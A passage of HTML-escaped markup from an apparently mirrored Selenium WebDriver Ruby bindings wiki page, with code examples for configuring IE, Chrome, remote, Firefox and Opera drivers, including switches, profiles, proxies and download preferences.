&lt;/li&gt;&lt;li&gt;&lt;span&gt;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;key_up(&lt;span class="symbol"&gt;:shift&lt;/span&gt;
&lt;span&gt;).&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;drag_and_drop(element,&amp;#160;third_element).&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;li&gt;&lt;span&gt;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;perform&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;/div&gt;&lt;pre class="ruby" style="display: none;" title="Selenium2 with ruby"&gt;driver.action.key_down(:shift).
              click(element).
              double_click(second_element).
              key_up(:shift).
              drag_and_drop(element, third_element).
              perform&lt;/pre&gt;
&amp;#160;
&lt;p&gt;
&lt;/span&gt;
&lt;/p&gt;
&lt;h2 style="font-size: large; background-image: none; background-color: initial; padding-left: 0px;"&gt;IE&lt;/h2&gt;
&lt;p style="line-height: 1.25em;"&gt;Make sure that&amp;#160;&lt;em&gt;Internet Options&lt;/em&gt;&amp;#160;→&amp;#160;&lt;em&gt;Security&lt;/em&gt;&amp;#160;has the same&amp;#160;&lt;em&gt;Protected Mode&lt;/em&gt;&amp;#160;setting (on or off, it doesn't matter as long as it is the same value) for all zones.&lt;/p&gt;
&lt;h2 style="font-size: large; background-image: none; background-color: initial; padding-left: 0px;"&gt;
&lt;a name="Chrome"&gt;&lt;/a&gt;Chrome&lt;/h2&gt;
&lt;h3 style="font-size: medium; background-image: none; background-color: initial; border-top-style: solid; border-top-color: #3366cc; padding-top: 0.5ex; padding-right: 0.5em; padding-bottom: 0.5ex; padding-left: 0px; margin: 0px;"&gt;
&lt;a name="Command_line_switches"&gt;&lt;/a&gt;Command line switches&lt;/h3&gt;
&lt;p style="line-height: 1.25em;"&gt;For a list of switches, see&amp;#160;&lt;a style="color: #0000cc;" href="http://codesearch.google.com/codesearch#OAMlx_jo-ck/src/chrome/common/chrome_switches.cc&amp;amp;exact_package=chromium"&gt;chrome_switches.cc&lt;/a&gt;:&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;&amp;#160;&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;&amp;#160;&lt;/p&gt;
&lt;div class="dp-highlighter"&gt;&lt;div class="bar"&gt;&lt;div class="tools"&gt;Ruby代码 &lt;embed wmode="transparent" src="/javascripts/syntaxhighlighter/clipboard_new.swf" width="14" height="15" flashvars="clipboard=driver%20%3D%20Selenium%3A%3AWebDriver.for%20%3Achrome%2C%20%3Aswitches%20%3D%3E%20%0A%25w%5B--ignore-certificate-errors%20--disable-popup-blocking%20--disable-translate%5D%0A" allowscriptaccess="always" type="application/x-shockwave-flash" /&gt;&amp;#160;&lt;a href="javascript:void()" title="收藏这段代码" onclick="code_favorites_do_favorite(this);return false;"&gt;&lt;img class="star" src="/images/icon_star.png" alt="收藏代码" /&gt;&lt;img class="spinner" src="/images/spinner.gif" style="display:none" /&gt;&lt;/a&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;ol class="dp-rb"&gt;&lt;li&gt;&lt;span&gt;&lt;span&gt;driver&amp;#160;=&amp;#160;Selenium::WebDriver.&lt;/span&gt;
&lt;span class="keyword"&gt;for&lt;/span&gt;
&lt;span class="symbol"&gt;:chrome&lt;/span&gt;
&lt;span&gt;,&amp;#160;&lt;/span&gt;
&lt;span class="symbol"&gt;:switches&lt;/span&gt;
&lt;span&gt;&amp;#160;=&amp;gt;&amp;#160;&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;%w[--ignore-certificate-errors&amp;#160;--disable-popup-blocking&amp;#160;--disable-translate]&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;/div&gt;&lt;pre class="ruby" style="display: none;" title="Selenium2 with ruby"&gt;driver = Selenium::WebDriver.for :chrome, :switches =&amp;gt; 
%w[--ignore-certificate-errors --disable-popup-blocking --disable-translate]
&lt;/pre&gt;

&lt;p style="line-height: 1.25em;"&gt;&amp;#160;&lt;/p&gt;
&lt;p&gt;

&lt;/span&gt;
&lt;/p&gt;
&lt;h3 style="font-size: medium; background-image: none; background-color: initial; border-top-style: solid; border-top-color: #3366cc; padding-top: 0.5ex; padding-right: 0.5em; padding-bottom: 0.5ex; padding-left: 0px; margin: 0px;"&gt;Tweaking profile preferences&lt;/h3&gt;
&lt;p style="line-height: 1.25em;"&gt;For a list of prefs, see&amp;#160;&lt;a style="color: #0000cc;" href="http://codesearch.google.com/codesearch#OAMlx_jo-ck/src/chrome/common/pref_names.cc&amp;amp;exact_package=chromium"&gt;pref_names.cc&lt;/a&gt;.&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;&amp;#160;&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;&amp;#160;&lt;/p&gt;
&lt;div class="dp-highlighter"&gt;&lt;div class="bar"&gt;&lt;div class="tools"&gt;Ruby代码 &lt;embed wmode="transparent" src="/javascripts/syntaxhighlighter/clipboard_new.swf" width="14" height="15" flashvars="clipboard=profile%20%3D%20Selenium%3A%3AWebDriver%3A%3AChrome%3A%3AProfile.new%0Aprofile%5B'download.prompt_for_download'%5D%20%3D%20false%0Aprofile%5B'download.default_directory'%5D%20%3D%20%22%2Fpath%2Fto%2Fdir%22%0A%0Adriver%20%3D%20Selenium%3A%3AWebDriver.for%20%3Achrome%2C%20%3Aprofile%20%3D%3E%20profile" allowscriptaccess="always" type="application/x-shockwave-flash" /&gt;&amp;#160;&lt;a href="javascript:void()" title="收藏这段代码" onclick="code_favorites_do_favorite(this);return false;"&gt;&lt;img class="star" src="/images/icon_star.png" alt="收藏代码" /&gt;&lt;img class="spinner" src="/images/spinner.gif" style="display:none" /&gt;&lt;/a&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;ol class="dp-rb"&gt;&lt;li&gt;&lt;span&gt;&lt;span&gt;profile&amp;#160;=&amp;#160;Selenium::WebDriver::Chrome::Profile.&lt;/span&gt;
&lt;span class="keyword"&gt;new&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;profile[&lt;span class="string"&gt;'download.prompt_for_download'&lt;/span&gt;
&lt;span&gt;]&amp;#160;=&amp;#160;&lt;/span&gt;
&lt;span class="keyword"&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;profile[&lt;span class="string"&gt;'download.default_directory'&lt;/span&gt;
&lt;span&gt;]&amp;#160;=&amp;#160;&lt;/span&gt;
&lt;span class="string"&gt;"/path/to/dir"&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;driver&amp;#160;=&amp;#160;Selenium::WebDriver.&lt;span class="keyword"&gt;for&lt;/span&gt;
&lt;span class="symbol"&gt;:chrome&lt;/span&gt;
&lt;span&gt;,&amp;#160;&lt;/span&gt;
&lt;span class="symbol"&gt;:profile&lt;/span&gt;
&lt;span&gt;&amp;#160;=&amp;gt;&amp;#160;profile&amp;#160;&amp;#160;&lt;/span&gt;
&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;
&lt;pre class="ruby" style="display: none;" title="Selenium2 with ruby"&gt;profile = Selenium::WebDriver::Chrome::Profile.new
profile['download.prompt_for_download'] = false
profile['download.default_directory'] = "/path/to/dir"

driver = Selenium::WebDriver.for :chrome, :profile =&amp;gt; profile&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;&amp;#160;&lt;/p&gt;
&lt;p&gt;

&lt;/span&gt;
&lt;/p&gt;&lt;p style="line-height: 1.25em;"&gt;See also&amp;#160;&lt;a style="color: #0000cc;" href="http://code.google.com/p/selenium/wiki/ChromeDriver"&gt;ChromeDriver&lt;/a&gt;.&lt;/p&gt;
&lt;h2 style="font-size: large; background-image: none; background-color: initial; padding-left: 0px;"&gt;
&lt;a name="Remote"&gt;&lt;/a&gt;Remote&lt;/h2&gt;
&lt;p style="line-height: 1.25em;"&gt;The&amp;#160;&lt;a style="color: #0000cc;" href="http://code.google.com/p/selenium/wiki/RemoteWebDriver"&gt;RemoteWebDriver&lt;/a&gt;&amp;#160;makes it easy to control a browser running on another machine. Download the jar (from&amp;#160;&lt;a style="color: #0000cc;" href="http://code.google.com/p/selenium/downloads/list"&gt;Downloads&lt;/a&gt;) and launch the server:&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;java -jar selenium-server-standalone.jar&lt;/tt&gt;
&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;Then connect to it from Ruby&lt;/p&gt;
&lt;pre class="prettyprint"&gt;driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt;(:&lt;/span&gt;remote&lt;/span&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;By default, this connects to the server running on localhost:4444 and opens Firefox. To connect to another machine, use the&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;:url&lt;/tt&gt;&amp;#160;option:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt;(:&lt;/span&gt;remote&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;url &lt;/span&gt;=&amp;gt;&lt;/span&gt; &lt;/span&gt;"http://myserver:4444/wd/hub"&lt;/span&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;To launch another browser, use the :desired_capabilities option:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt;(:&lt;/span&gt;remote&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;desired_capabilities &lt;/span&gt;=&amp;gt;&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;chrome&lt;/span&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;You can also pass an instance of&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;Selenium::WebDriver::Remote::Capabilities&lt;/tt&gt;, e.g.:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;include &lt;/span&gt;Selenium&lt;/span&gt;

caps &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Remote&lt;/span&gt;::&lt;/span&gt;Capabilities&lt;/span&gt;.&lt;/span&gt;htmlunit&lt;/span&gt;(:&lt;/span&gt;javascript_enabled &lt;/span&gt;=&amp;gt;&lt;/span&gt; &lt;/span&gt;true&lt;/span&gt;)&lt;/span&gt;
driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt;(:&lt;/span&gt;remote&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;desired_capabilities &lt;/span&gt;=&amp;gt;&lt;/span&gt; caps&lt;/span&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;You may want to set the proxy settings of the remote browser (this currently only works for Firefox):&lt;/p&gt;
&lt;pre class="prettyprint"&gt;include &lt;/span&gt;Selenium&lt;/span&gt;

caps &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Remote&lt;/span&gt;::&lt;/span&gt;Capabilities&lt;/span&gt;.&lt;/span&gt;firefox&lt;/span&gt;(:&lt;/span&gt;proxy &lt;/span&gt;=&amp;gt;&lt;/span&gt; &lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Proxy&lt;/span&gt;.&lt;/span&gt;new&lt;/span&gt;(:&lt;/span&gt;http &lt;/span&gt;=&amp;gt;&lt;/span&gt; &lt;/span&gt;"myproxyaddress:8080"&lt;/span&gt;))&lt;/span&gt;
driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt;(:&lt;/span&gt;remote&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;desired_capabilities &lt;/span&gt;=&amp;gt;&lt;/span&gt; caps&lt;/span&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;Or if you have a proxy in front of the remote server:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;include &lt;/span&gt;Selenium&lt;/span&gt;

client &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Remote&lt;/span&gt;::&lt;/span&gt;Http&lt;/span&gt;::&lt;/span&gt;Default&lt;/span&gt;.&lt;/span&gt;new&lt;/span&gt;
client&lt;/span&gt;.&lt;/span&gt;proxy &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Proxy&lt;/span&gt;.&lt;/span&gt;new&lt;/span&gt;(:&lt;/span&gt;http &lt;/span&gt;=&amp;gt;&lt;/span&gt; &lt;/span&gt;"proxy.org:8080"&lt;/span&gt;)&lt;/span&gt;

driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt;(:&lt;/span&gt;remote&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;http_client &lt;/span&gt;=&amp;gt;&lt;/span&gt; client&lt;/span&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;See&amp;#160;&lt;a style="color: #0000cc;" href="http://code.google.com/p/selenium/source/browse/trunk/rb/lib/selenium/webdriver/common/proxy.rb"&gt;`Selenium::WebDriver::Proxy`&lt;/a&gt;&amp;#160;for more options.&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;For the remote Firefox driver you can configure the profile, see the section&amp;#160;&lt;a style="color: #0000cc;" href="http://code.google.com/p/selenium/wiki/RubyBindings#Tweaking_Firefox_preferences"&gt;Tweaking Firefox preferences&lt;/a&gt;.&lt;/p&gt;
&lt;h2 style="font-size: large; background-image: none; background-color: initial; padding-left: 0px;"&gt;
&lt;a name="Firefox"&gt;&lt;/a&gt;Firefox&lt;/h2&gt;
&lt;p style="line-height: 1.25em;"&gt;The&amp;#160;&lt;a style="color: #0000cc;" href="http://code.google.com/p/selenium/wiki/FirefoxDriver"&gt;FirefoxDriver&lt;/a&gt;&amp;#160;lets you configure the profile used.&lt;/p&gt;
&lt;h3 style="font-size: medium; background-image: none; background-color: initial; border-top-style: solid; border-top-color: #3366cc; padding-top: 0.5ex; padding-right: 0.5em; padding-bottom: 0.5ex; padding-left: 0px; margin: 0px;"&gt;
&lt;a name="Adding_an_extension"&gt;&lt;/a&gt;Adding an extension&lt;/h3&gt;
&lt;p style="line-height: 1.25em;"&gt;It's often useful to have Firebug available in the Firefox instance launched by WebDriver:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;include &lt;/span&gt;Selenium&lt;/span&gt;

profile &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Firefox&lt;/span&gt;::&lt;/span&gt;Profile&lt;/span&gt;.&lt;/span&gt;new&lt;/span&gt;
profile&lt;/span&gt;.&lt;/span&gt;add_extension&lt;/span&gt;(&lt;/span&gt;"/path/to/firebug.xpi"&lt;/span&gt;)&lt;/span&gt;

driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;firefox&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;profile &lt;/span&gt;=&amp;gt;&lt;/span&gt; profile&lt;/span&gt;
&lt;/pre&gt;
&lt;h3 style="font-size: medium; background-image: none; background-color: initial; border-top-style: solid; border-top-color: #3366cc; padding-top: 0.5ex; padding-right: 0.5em; padding-bottom: 0.5ex; padding-left: 0px; margin: 0px;"&gt;
&lt;a name="Using_an_existing_profile"&gt;&lt;/a&gt;Using an existing profile&lt;/h3&gt;
&lt;p style="line-height: 1.25em;"&gt;You can use an existing profile as a template for the WebDriver profile by passing the profile name (see&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;firefox -ProfileManager&lt;/tt&gt;&amp;#160;to set up custom profiles.)&lt;/p&gt;
&lt;pre class="prettyprint"&gt;driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt;(:&lt;/span&gt;firefox&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;profile &lt;/span&gt;=&amp;gt;&lt;/span&gt; &lt;/span&gt;"my-existing-profile"&lt;/span&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;If you want to use your default profile, pass&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;:profile =&amp;gt; "default"&lt;/tt&gt;
&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;You can also get a Profile instance for an existing profile and tweak its preferences. This does not modify the existing profile, only the one used by WebDriver.&lt;/p&gt;
&lt;pre class="prettyprint"&gt;default_profile &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Firefox&lt;/span&gt;::&lt;/span&gt;Profile&lt;/span&gt;.&lt;/span&gt;from_name &lt;/span&gt;"default"&lt;/span&gt;
default_profile&lt;/span&gt;.&lt;/span&gt;native_events &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;true&lt;/span&gt;

driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt;(:&lt;/span&gt;firefox&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;profile &lt;/span&gt;=&amp;gt;&lt;/span&gt; default_profile&lt;/span&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;h3 style="font-size: medium; background-image: none; background-color: initial; border-top-style: solid; border-top-color: #3366cc; padding-top: 0.5ex; padding-right: 0.5em; padding-bottom: 0.5ex; padding-left: 0px; margin: 0px;"&gt;
&lt;a name="Tweaking_Firefox_preferences"&gt;&lt;/a&gt;Tweaking Firefox preferences&lt;/h3&gt;
&lt;p style="line-height: 1.25em;"&gt;Use a proxy:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;profile &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Firefox&lt;/span&gt;::&lt;/span&gt;Profile&lt;/span&gt;.&lt;/span&gt;new&lt;/span&gt;
proxy &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Proxy&lt;/span&gt;.&lt;/span&gt;new&lt;/span&gt;(:&lt;/span&gt;http &lt;/span&gt;=&amp;gt;&lt;/span&gt; &lt;/span&gt;"proxy.org:8080"&lt;/span&gt;)&lt;/span&gt;
profile&lt;/span&gt;.&lt;/span&gt;proxy &lt;/span&gt;=&lt;/span&gt; proxy

driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;firefox&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;profile &lt;/span&gt;=&amp;gt;&lt;/span&gt; profile&lt;/span&gt;
&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;Automatically download files to a given folder:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;profile &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Firefox&lt;/span&gt;::&lt;/span&gt;Profile&lt;/span&gt;.&lt;/span&gt;new&lt;/span&gt;
profile&lt;/span&gt;[&lt;/span&gt;'browser.download.dir'&lt;/span&gt;]&lt;/span&gt; &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;"/tmp/webdriver-downloads"&lt;/span&gt;
profile&lt;/span&gt;[&lt;/span&gt;'browser.download.folderList'&lt;/span&gt;]&lt;/span&gt; &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;2&lt;/span&gt;
profile&lt;/span&gt;[&lt;/span&gt;'browser.helperApps.neverAsk.saveToDisk'&lt;/span&gt;]&lt;/span&gt; &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;"application/pdf"&lt;/span&gt;

driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;firefox&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;profile &lt;/span&gt;=&amp;gt;&lt;/span&gt; profile&lt;/span&gt;
&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;If you are using the remote driver you can still configure the Firefox profile:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;profile &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Firefox&lt;/span&gt;::&lt;/span&gt;Profile&lt;/span&gt;.&lt;/span&gt;new&lt;/span&gt;
profile&lt;/span&gt;[&lt;/span&gt;'foo.bar'&lt;/span&gt;]&lt;/span&gt; &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;true&lt;/span&gt;
&amp;#160; 
capabilities &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Remote&lt;/span&gt;::&lt;/span&gt;Capabilities&lt;/span&gt;.&lt;/span&gt;firefox&lt;/span&gt;(:&lt;/span&gt;firefox_profile &lt;/span&gt;=&amp;gt;&lt;/span&gt; profile&lt;/span&gt;)&lt;/span&gt;
driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;remote&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;desired_capabilities &lt;/span&gt;=&amp;gt;&lt;/span&gt; capabilities&lt;/span&gt;
&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;For a list of possible preferences, see&amp;#160;&lt;a style="color: #0000cc;" href="http://preferential.mozdev.org/preferences.html"&gt;this page&lt;/a&gt;.&lt;/p&gt;
&lt;h3 style="font-size: medium; background-image: none; background-color: initial; border-top-style: solid; border-top-color: #3366cc; padding-top: 0.5ex; padding-right: 0.5em; padding-bottom: 0.5ex; padding-left: 0px; margin: 0px;"&gt;
&lt;a name="Custom_Firefox_path"&gt;&lt;/a&gt;Custom Firefox path&lt;/h3&gt;
&lt;p style="line-height: 1.25em;"&gt;If your Firefox executable is in a non-standard location:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Firefox&lt;/span&gt;.&lt;/span&gt;path &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;"/path/to/firefox"&lt;/span&gt;
driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;firefox&lt;/span&gt;
&lt;/pre&gt;
&lt;h3 style="font-size: medium; background-image: none; background-color: initial; border-top-style: solid; border-top-color: #3366cc; padding-top: 0.5ex; padding-right: 0.5em; padding-bottom: 0.5ex; padding-left: 0px; margin: 0px;"&gt;
&lt;a name="Native_events"&gt;&lt;/a&gt;Native events&lt;/h3&gt;
&lt;p style="line-height: 1.25em;"&gt;Native events are enabled by default on Windows. To turn them off:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;profile &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;::&lt;/span&gt;Firefox&lt;/span&gt;::&lt;/span&gt;Profile&lt;/span&gt;.&lt;/span&gt;new&lt;/span&gt;
profile&lt;/span&gt;.&lt;/span&gt;native_events &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;false&lt;/span&gt;

driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt;(:&lt;/span&gt;firefox&lt;/span&gt;,&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;profile &lt;/span&gt;=&amp;gt;&lt;/span&gt; profile&lt;/span&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p style="line-height: 1.25em;"&gt;Experimental support for native events is available on Linux. Set&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;profile.native_events = true&lt;/tt&gt;&amp;#160;to turn this on.&lt;/p&gt;
&lt;h2 style="font-size: large; background-image: none; background-color: initial; padding-left: 0px;"&gt;
&lt;a name="Opera"&gt;&lt;/a&gt;Opera&lt;/h2&gt;
&lt;p style="line-height: 1.25em;"&gt;The&amp;#160;&lt;a style="color: #0000cc;" href="http://code.google.com/p/selenium/wiki/OperaDriver"&gt;OperaDriver&lt;/a&gt;&amp;#160;is always run as a&amp;#160;&lt;a style="color: #0000cc;" href="http://code.google.com/p/selenium/wiki/RemoteWebDriver"&gt;RemoteWebDriver&lt;/a&gt;&amp;#160;server which the Ruby bindings connect to.&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;To get started, first&amp;#160;&lt;a style="color: #0000cc;" href="http://code.google.com/p/selenium/downloads/list"&gt;download&lt;/a&gt;&amp;#160;the&amp;#160;&lt;em&gt;selenium-server-standalone&lt;/em&gt;&amp;#160;jar and set the&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;SELENIUM_SERVER_JAR&lt;/tt&gt;&amp;#160;environmental variable to point to its location:&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;export SELENIUM_SERVER_JAR=/path/to/server-standalone.jar&lt;/tt&gt;
&lt;/p&gt;
&lt;p style="line-height: 1.25em;"&gt;Then you can simply create a new instance of&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;Selenium::WebDriver&lt;/tt&gt;&amp;#160;with the&amp;#160;&lt;tt style="font-family: Monaco, 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Lucida Console', monospace; font-size: 12px;"&gt;:opera&lt;/tt&gt;&amp;#160;option:&lt;/p&gt;
&lt;pre class="prettyprint"&gt;driver &lt;/span&gt;=&lt;/span&gt; &lt;/span&gt;Selenium&lt;/span&gt;::&lt;/span&gt;WebDriver&lt;/span&gt;.&lt;/span&gt;for&lt;/span&gt; &lt;/span&gt;:&lt;/span&gt;opera
driver&lt;/span&gt;.&lt;/span&gt;navigate&lt;/span&gt;.&lt;/span&gt;to &lt;/span&gt;'http://opera.com/'&lt;/span&gt;
&lt;/pre&gt;
&lt;h2 style="font-size: large; background-image: none; background-color: initial; padding-left: 0px;"&gt;
